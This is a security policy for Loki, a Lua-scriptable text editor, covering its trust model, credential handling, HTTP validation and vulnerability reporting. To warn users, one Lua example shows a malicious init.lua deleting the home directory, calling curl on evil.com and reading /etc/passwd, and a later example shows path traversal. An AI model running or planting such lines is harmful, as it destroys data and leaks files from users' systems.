# Security Policy

## Table of Contents

- [Security Model Overview](#security-model-overview)
- [Lua Security Model](#lua-security-model)
- [HTTP Security](#http-security)
- [File System Security](#file-system-security)
- [Best Practices](#best-practices)
- [Known Limitations](#known-limitations)
- [Reporting Vulnerabilities](#reporting-vulnerabilities)

---

## Security Model Overview

### Trust Boundaries

Loki is a **single-user text editor** designed to run on trusted systems with the full privileges of the executing user. The security model assumes:

1. **Trusted Environment**: The system running Loki is under your control
2. **Trusted Configuration**: Lua scripts in `.loki/init.lua` are authored or reviewed by you
3. **Trusted Input**: Files opened in the editor come from trusted sources
4. **User-Level Isolation**: Loki operates within your user account's permissions

### Threat Model

**In Scope:**
- Protection against accidental data corruption
- Defense against malformed file inputs (binary files, extremely long lines)
- Safe handling of network responses
- Prevention of common memory safety issues (buffer overflows, use-after-free)

**Out of Scope:**
- Sandboxing untrusted Lua scripts (by design)
- Protection against malicious system administrators
- Multi-user isolation (Loki is single-user)
- Protection against compromised dependencies (Lua, libcurl)

### Attack Surface

1. **File Input**: Text files opened in the editor
   - Mitigation: Binary file detection, line length limits, bounds checking
2. **Lua Scripts**: Configuration files (`.loki/init.lua`, modules, languages, themes)
   - Mitigation: User review, local-only execution
3. **HTTP Responses**: Async HTTP request responses
   - Mitigation: SSL/TLS verification, timeout limits, size limits
4. **Terminal Input**: Keyboard input and VT100 sequences
   - Mitigation: Input validation, escape sequence filtering

---

## Lua Security Model

### Execution Model

**Loki executes Lua scripts with the full privileges of your user account.** There is **no sandboxing** by design. This is intentional for several reasons:

1. **Simplicity**: No complex sandboxing mechanisms to maintain or bypass
2. **Functionality**: Full access to system APIs enables powerful automation
3. **Trust Model**: You control what scripts run in your editor
4. **Single-User**: Loki is not a multi-user or network service

### Configuration File Trust

Loki loads Lua configuration in this order:

1. **Local project config**: `.loki/init.lua` (current working directory)
2. **Global config**: `~/.loki/init.lua` (home directory)

**Security Implications:**

```lua
-- .loki/init.lua can do ANYTHING your user account can do:
os.execute("rm -rf ~/*")              -- Delete your home directory
io.popen("curl http://evil.com"):read()  -- Send data to remote server
require("socket").tcp():connect()     -- Open network connections
io.open("/etc/passwd"):read("*a")     -- Read sensitive files (if permissions allow)
```

### Risks

| Risk | Severity | Mitigation |
|------|----------|------------|
| Malicious `.loki/init.lua` in cloned repos | **CRITICAL** | Always review before opening projects |
| Typosquatting in module names | **HIGH** | Verify module sources |
| API key leakage in config files | **HIGH** | Use environment variables, never commit keys |
| Unintended file system operations | **MEDIUM** | Review scripts before execution |

### Safe Configuration Practices

**DO:**
```lua
-- Use environment variables for secrets
local api_key = os.getenv("OPENAI_API_KEY")

-- Validate external inputs
local function safe_insert(text)
    if type(text) ~= "string" or #text > 10000 then
        loki.status("Invalid input")
        return
    end
    loki.insert_text(text)
end

-- Use pcall for error handling
local ok, result = pcall(function()
    return require("untrusted_module")
end)
if not ok then
    loki.status("Failed to load module: " .. result)
end
```

**DON'T:**
```lua
-- Don't hardcode credentials
local api_key = "sk-proj-abc123..."  -- NEVER DO THIS

-- Don't execute arbitrary code from files
local code = io.open("script.lua"):read("*a")
loadstring(code)()  -- DANGEROUS

-- Don't trust user input without validation
function on_http_response(response)
    loadstring(response.body)()  -- NEVER DO THIS
end
```

### Module Security

When using third-party modules:

1. **Review Source Code**: Always read modules before using them
2. **Check Origins**: Prefer modules from known, trusted authors
3. **Pin Versions**: Don't auto-update without reviewing changes
4. **Isolate Risk**: Use separate config files for experimental modules

**Example Safe Module Loading:**

```lua
-- Check if module file exists and is readable
local function safe_require(module_path)
    local f = io.open(module_path, "r")
    if not f then
        loki.status("Module not found: " .. module_path)
        return nil
    end

    -- Check file size (prevent loading huge files)
    local size = f:seek("end")
    f:close()

    if size > 100000 then  -- 100KB limit
        loki.status("Module too large: " .. module_path)
        return nil
    end

    -- Load with pcall for error handling
    local ok, module = pcall(dofile, module_path)
    if not ok then
        loki.status("Failed to load: " .. module)
        return nil
    end

    return module
end
```

---

## HTTP Security

### Async HTTP Requests

Loki can make HTTP requests via `loki.async_http()`. These requests:

- Run with **libcurl** (industry-standard, well-audited)
- Support **HTTPS with SSL/TLS verification** (default: enabled)
- Have **30-second timeouts** to prevent hangs
- Are **limited to 10 concurrent requests** to prevent resource exhaustion

### SSL/TLS Verification

By default, libcurl verifies SSL certificates. **Never disable verification** unless you have a specific, understood reason.

```lua
-- GOOD: Uses HTTPS with certificate verification
loki.async_http(
    "https://api.openai.com/v1/chat/completions",
    "POST",
    json_body,
    {"Authorization: Bearer " .. api_key},
    "response_handler"
)

-- BAD: Uses HTTP (unencrypted)
loki.async_http(
    "http://api.openai.com/...",  -- INSECURE
    "POST",
    json_body,
    {"Authorization: Bearer " .. api_key},  -- Exposed to network sniffing
    "response_handler"
)
```

### Credential Management

**Best Practices:**

1. **Environment Variables**: Store API keys in environment variables
   ```lua
   local api_key = os.getenv("OPENAI_API_KEY")
   if not api_key then
       loki.status("Error: OPENAI_API_KEY not set")
       return
   end
   ```

2. **Never Commit Secrets**: Use `.gitignore` for config files with credentials
   ```gitignore
   # .gitignore
   .loki/secrets.lua
   .loki/api_keys.lua
   ```

3. **Separate Files**: Keep secrets in separate, local-only files
   ```lua
   -- .loki/init.lua (version controlled)
   local secrets = dofile(os.getenv("HOME") .. "/.loki/secrets.lua")

   -- ~/.loki/secrets.lua (NOT version controlled)
   return {
       openai_key = "sk-proj-...",
       anthropic_key = "sk-ant-..."
   }
   ```

4. **Restricted Permissions**: Protect secret files
   ```bash
   chmod 600 ~/.loki/secrets.lua
   ```

### Request Validation

Always validate HTTP responses before processing:

```lua
function http_response_handler(response)
    -- Check for nil response
    if not response then
        loki.status("Error: No response received")
        return
    end

    -- Check for network errors
    if response.error then
        loki.status("HTTP Error: " .. response.error)
        return
    end

    -- Check HTTP status code
    if response.status ~= 200 then
        loki.status(string.format("HTTP %d error", response.status))
        return
    end

    -- Validate response body exists
    if not response.body or #response.body == 0 then
        loki.status("Error: Empty response")
        return
    end

    -- Validate response size (prevent DoS via huge responses)
    if #response.body > 1000000 then  -- 1MB limit
        loki.status("Error: Response too large")
        return
    end

    -- Parse JSON safely
    local ok, parsed = pcall(parse_json, response.body)
    if not ok then
        loki.status("Error: Invalid JSON response")
        return
    end

    -- Use the response
    process_response(parsed)
end
```

### Network Security Checklist

- [ ] Use HTTPS for all sensitive communications
- [ ] Store API keys in environment variables or `~/.loki/secrets.lua`
- [ ] Never commit credentials to version control
- [ ] Validate all HTTP responses before processing
- [ ] Set reasonable size limits on response bodies
- [ ] Use timeouts to prevent indefinite hangs
- [ ] Log errors without exposing sensitive data

---

## File System Security

### File Access Permissions

Loki operates with the permissions of your user account. It can:

- Read any file you can read
- Write any file you can write
- Execute any command you can execute (via `os.execute()` in Lua)

**Mitigation**: Run Loki under a dedicated user account with restricted permissions if working with untrusted files.

### Binary File Protection

Loki detects and rejects binary files to prevent:

- Display corruption from null bytes and control characters
- Potential buffer overflows from malformed data
- Accidental modification of executable files

**Implementation** (loki_core.c:679-720):
```c
/* Detect binary files by checking for null bytes in first 1KB */
size_t check_size = (file_size < 1024) ? file_size : 1024;
for (size_t i = 0; i < check_size; i++) {
    if (sample[i] == '\0') {
        fclose(fp);
        return -1;  /* Binary file detected */
    }
}
```

### Path Traversal

Loki does not currently validate file paths. Lua scripts can access arbitrary paths:

```lua
-- Lua scripts can read/write any file the user can access
local f = io.open("/etc/passwd", "r")
local f = io.open("../../../../etc/passwd", "r")  -- Path traversal
```

**Mitigation**: Only open files from trusted directories. Consider using absolute paths and validating them.

### Temporary Files

Loki creates temporary files in `/tmp` during testing. These files:

- Are created with default umask (typically 0022, world-readable)
- May persist if tests crash
- Could expose sensitive data if file contains secrets

**Best Practice**: Avoid editing files with secrets. Use environment variables instead.

---

## Best Practices

### For Users

1. **Review Configuration Files**
   - Always inspect `.loki/init.lua` in new projects before opening
   - Treat config files as executable code (because they are)
   - Use `less .loki/init.lua` before opening the editor

2. **Secure Credentials**
   ```bash
   # Store API keys in environment, not config files
   export OPENAI_API_KEY="sk-proj-..."
   export ANTHROPIC_API_KEY="sk-ant-..."

   # Add to ~/.bashrc or ~/.zshrc, never commit
   ```

3. **Use HTTPS**
   - Always use HTTPS URLs for API requests
   - Verify SSL certificates (default behavior)

4. **Limit Privileges**
   - Don't run Loki as root
   - Use dedicated user accounts for working with untrusted files

5. **Keep Dependencies Updated**
   ```bash
   # Update system packages regularly
   brew update && brew upgrade  # macOS
   apt update && apt upgrade    # Ubuntu/Debian
   ```

### For Developers

1. **Memory Safety**
   - Always check malloc/realloc return values
   - Validate array bounds before access
   - Free allocated memory in all code paths
   - Use AddressSanitizer during development:
     ```bash
     cmake -B build -DCMAKE_C_FLAGS="-fsanitize=address -g"
     make -C build
     ```

2. **Input Validation**
   - Check all file inputs for expected format
   - Validate HTTP response sizes and content
   - Sanitize terminal escape sequences

3. **Error Handling**
   - Use `pcall()` in Lua for error isolation
   - Check return values from C functions
   - Never ignore errors silently

4. **Code Review**
   - Review all PRs for security implications
   - Run static analysis tools (clang-tidy, cppcheck)
   - Test with fuzzing tools (AFL, libFuzzer)

5. **Testing**
   ```bash
   # Run tests with memory checking
   make test

   # Run with Valgrind for leak detection
   valgrind --leak-check=full ./build/test_core

   # Run with AddressSanitizer
   ASAN_OPTIONS=detect_leaks=1 ./build/test_core
   ```

---

## Known Limitations

### 1. No Lua Sandboxing

**Impact**: Malicious Lua scripts can compromise your system

**Mitigation**: Only load trusted configuration files

**Status**: By design (will not change)

### 2. Credentials in Configuration Files

**Impact**: Hardcoded API keys may be exposed via version control

**Mitigation**: Use environment variables, add `.loki/secrets.lua` to `.gitignore`

**Status**: User responsibility

### 3. Path Traversal in Lua Scripts

**Impact**: Lua scripts can access arbitrary file system paths

**Mitigation**: Only open projects from trusted sources

**Status**: By design (Lua has full file system access)

### 4. No Multi-User Isolation

**Impact**: Loki is designed for single-user systems only

**Mitigation**: Don't use Loki in multi-user or server environments

**Status**: Out of scope

### 5. Temporary File Permissions

**Impact**: Test files in `/tmp` may be world-readable

**Mitigation**: Don't edit sensitive data in tests

**Status**: Low priority (test-only issue)

---

## Reporting Vulnerabilities

### Scope

We take security seriously for **memory safety**, **file handling**, and **network security** issues.

**In Scope:**
- Memory safety vulnerabilities (buffer overflows, use-after-free, null pointer dereferences)
- File parsing vulnerabilities (malformed inputs causing crashes)
- HTTP security issues (SSL/TLS handling, credential leakage)
- Binary file detection bypasses

**Out of Scope:**
- Lua script execution (by design, scripts have full access)
- Path traversal in Lua (by design, Lua has file system access)
- Social engineering attacks (tricking users into running malicious configs)
- Vulnerabilities in dependencies (report to upstream: Lua, libcurl, OpenSSL)

### How to Report

**For security vulnerabilities:**

1. **DO NOT** open a public GitHub issue
2. Email: `sa@example.com` (replace with your email)
3. Include:
   - Description of the vulnerability
   - Steps to reproduce
   - Proof of concept (if available)
   - Suggested fix (if you have one)

**Response Timeline:**
- **Acknowledgment**: Within 48 hours
- **Initial Assessment**: Within 7 days
- **Fix Timeline**: Depends on severity
  - Critical: 7-14 days
  - High: 14-30 days
  - Medium/Low: Next release cycle

### Recognition

Security researchers who report valid vulnerabilities will be:
- Credited in release notes (if desired)
- Listed in SECURITY.md acknowledgments
- Thanked publicly (with permission)

---

## Security Acknowledgments

We thank the following researchers for responsible disclosure:

*(None yet - be the first!)*

---

## Additional Resources

- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/)
- [Lua Security Best Practices](https://www.lua.org/pil/8.4.html)
- [libcurl Security](https://curl.se/docs/security.html)

---

**Last Updated**: 2025-01-12
**Version**: 1.0
